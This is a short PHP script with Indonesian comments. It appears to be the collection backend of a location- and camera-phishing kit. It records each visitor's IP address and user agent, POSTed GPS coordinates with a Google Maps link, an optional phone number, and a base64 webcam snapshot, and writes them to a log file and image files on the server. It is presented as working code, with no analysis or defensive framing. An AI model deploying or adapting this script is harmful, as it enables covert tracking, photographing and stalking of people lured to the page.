<?php
// Ambil IP & User-Agent
$ipaddress = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Ambil data dari POST
$latitude = $_POST['latitude'] ?? '';
$longitude = $_POST['longitude'] ?? '';
$number = $_POST['number'] ?? ''; // nomor hp / identitas lain (opsional)

// Buat link Google Maps (jika ada koordinat)
$mapsLink = '';
if ($latitude && $longitude) {
    $mapsLink = "https://www.google.com/maps?q={$latitude},{$longitude}";
}

// Simpan ke file log
$file = 'data.txt';
$log  = "==== Data Masuk ====\n";
$log .= "IP       : $ipaddress\n";
$log .= "UserAgent: $useragent\n";
if ($number)     $log .= "Nomor    : $number\n";
if ($latitude)   $log .= "Latitude : $latitude\n";
if ($longitude)  $log .= "Longitude: $longitude\n";
if ($mapsLink)   $log .= "Google Maps: $mapsLink\n";
$log .= "Waktu    : ".date('Y-m-d H:i:s')."\n\n";

file_put_contents($file, $log, FILE_APPEND);

// Jika ada gambar kamera, simpan juga
if (!empty($_POST['cam_image'])) {
    $date = date('dMY_His');
    $imageData = $_POST['cam_image'];
    $filteredData = substr($imageData, strpos($imageData,",")+1);
    $unencodedData = base64_decode($filteredData);
    file_put_contents("cam_$date.png", $unencodedData);
}

// Balas JSON ke client
header('Content-Type: application/json');
echo json_encode([
    "status" => "ok",
    "ip" => $ipaddress,
    "latitude" => $latitude,
    "longitude" => $longitude,
    "maps_link" => $mapsLink
]);
exit;
?>
